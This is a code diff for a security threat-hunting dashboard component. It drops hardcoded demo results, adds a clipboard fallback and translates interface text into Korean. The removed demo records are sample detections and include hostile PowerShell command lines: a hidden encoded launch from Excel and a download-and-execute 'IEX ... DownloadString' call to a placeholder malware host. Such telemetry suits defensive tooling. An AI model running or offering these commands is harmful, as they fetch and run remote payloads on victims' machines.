@@ -121,55 +121,6 @@ LIMIT 200`,
 | LIMIT 200`,
 };
 
-// ─── Demo fallback ────────────────────────────────────────────────────────────
-
-// Deterministic timestamps — no Date.now() to avoid SSR hydration mismatches.
-const DEMO_RESULTS: HuntResult[] = [
-  {
-    id: 'r-001',
-    timestamp: '2026-05-06T11:48:00Z',
-    source: 'crowdstrike',
-    severity: 'high',
-    fields: {
-      host: 'WORKSTATION-042',
-      user: 'john.doe',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
-      'process.parent.name': 'EXCEL.EXE',
-    },
-    highlight: 'powershell.exe -nop -w hidden -enc',
-  },
-  {
-    id: 'r-002',
-    timestamp: '2026-05-06T11:19:00Z',
-    source: 'defender',
-    severity: 'critical',
-    fields: {
-      host: 'SERVER-DC01',
-      user: 'svc_admin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
-      'network.destination.ip': '185.220.101.45',
-    },
-    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
-  },
-  {
-    id: 'r-003',
-    timestamp: '2026-05-06T10:00:00Z',
-    source: 'splunk',
-    severity: 'medium',
-    fields: {
-      host: 'WORKSTATION-019',
-      user: 'maria.lin',
-      'process.name': 'powershell.exe',
-      'process.command_line':
-        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
-    },
-  },
-];
-
 const DEMO_SAVED: SavedSearch[] = [
   {
     id: 'demo-1',
@@ -214,8 +165,45 @@ function severityClass(s?: AlertSeverity) {
 }
 
 function copyToClipboard(text: string) {
-  if (typeof navigator === 'undefined' || !navigator.clipboard) return;
-  void navigator.clipboard.writeText(text).then(() => toast.success('Copied'));
+  if (typeof navigator !== 'undefined' && navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard
+      .writeText(text)
+      .then(() => toast.success('Copied'))
+      .catch((err) => {
+        console.error('Clipboard copy failed:', err);
+        fallbackCopyToClipboard(text);
+      });
+    return;
+  }
+  fallbackCopyToClipboard(text);
+}
+
+// HTTP 환경 지원을 위한 Fallback 함수
+function fallbackCopyToClipboard(text: string) {
+  try {
+    const textArea = document.createElement('textarea');
+    textArea.value = text;
+    // 화면에 보이지 않도록 위치 조정
+    textArea.style.position = 'fixed';
+    textArea.style.top = '0';
+    textArea.style.left = '0';
+    textArea.style.opacity = '0';
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+
+    const successful = document.execCommand('copy');
+    document.body.removeChild(textArea);
+
+    if (successful) {
+      toast.success('Copied');
+    } else {
+      toast.error('Failed to copy');
+    }
+  } catch (err) {
+    console.error('Fallback copy failed:', err);
+    toast.error('Failed to copy');
+  }
 }
 
 // ─── NL hero block ───────────────────────────────────────────────────────────
@@ -614,14 +602,14 @@ function ResultRow({ result }: { result: HuntResult }) {
           </div>
           <div className="mt-3 flex flex-wrap items-center gap-2">
             <button
-              onClick={() => copyToClipboard(JSON.stringify(result.fields, null, 2))}
+              onClick={() => copyToClipboard(JSON.stringify(result.raw, null, 2))}
               className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
             >
               Copy JSON
             </button>
             <button
               onClick={() => {
-                const host = result.fields?.host;
+                const host = result.raw?.host;
                 const url = host ? `/graph?entity=${encodeURIComponent(String(host))}` : '/graph';
                 window.location.href = url;
               }}
@@ -784,15 +772,13 @@ export function HuntView() {
       setResults(res);
       setDemoMode(false);
     } catch (err) {
-      // Demo fallback so the page still feels alive without a seeded backend.
       setResults({
-        total: DEMO_RESULTS.length,
-        took: 42,
-        hits: DEMO_RESULTS,
+        total: 0,
+        took: 0,
+        hits: [],
       });
-      setDemoMode(true);
+      setDemoMode(false);
       setRunError(err);
-      toast('Backend unreachable — showing demo results');
     } finally {
       setRunning(false);
     }
@@ -1141,10 +1127,10 @@ export function HuntView() {
           <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
             <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 px-4 py-2.5">
               <h3 className="text-sm font-semibold text-slate-200">
-                Hunt results
+                수색 결과
                 {results && (
                   <span className="ml-2 text-xs font-normal text-slate-400">
-                    {(results.total ?? 0).toLocaleString()} hits ·{' '}
+                    {(results.total ?? 0).toLocaleString()} 건 ·{' '}
                     {(results.took ?? (results as any).took_ms ?? 0).toLocaleString()}ms
                   </span>
                 )}
@@ -1169,20 +1155,20 @@ export function HuntView() {
               </div>
             ) : !results ? (
               <EmptyState
-                title="Press Run to begin"
-                description="Tip: ask a question above, pick a saved hunt, or pivot from an alert."
+                title="수색을 시작하려면 Run 버튼을 누르세요"
+                description="팁: 상단에 가설 질문을 작성하거나, 저장된 수색 조건을 선택하세요."
               />
             ) : results.hits.length === 0 ? (
               <div className="flex flex-col items-center justify-center px-6 py-10">
                 <p className="text-sm font-medium text-emerald-300">
-                  No matches in the selected window
+                  조회된 수색 결과가 없습니다 (0건)
                 </p>
                 <p className="mt-1 text-xs text-slate-500">
                   {runError
-                    ? 'Backend unreachable — but here is the parsed query so you can refine it.'
+                    ? '백엔드 데이터베이스에 연결할 수 없으나, 해석된 쿼리를 에디터에서 수정할 수 있습니다.'
                     : nlSubmittedQuery
-                      ? 'The translator parsed your question (see editor) but found no events. Try a wider time range.'
-                      : 'Either the data is clean, or the query is too tight.'}
+                      ? 'AI 번역기가 가설 질문을 해석했으나 조건에 맞는 로그를 찾지 못했습니다. 시간 범위를 넓혀보세요.'
+                      : '현재 수집된 데이터가 깨끗하거나 검색 조건이 너무 엄격합니다.'}
                 </p>
               </div>
             ) : (
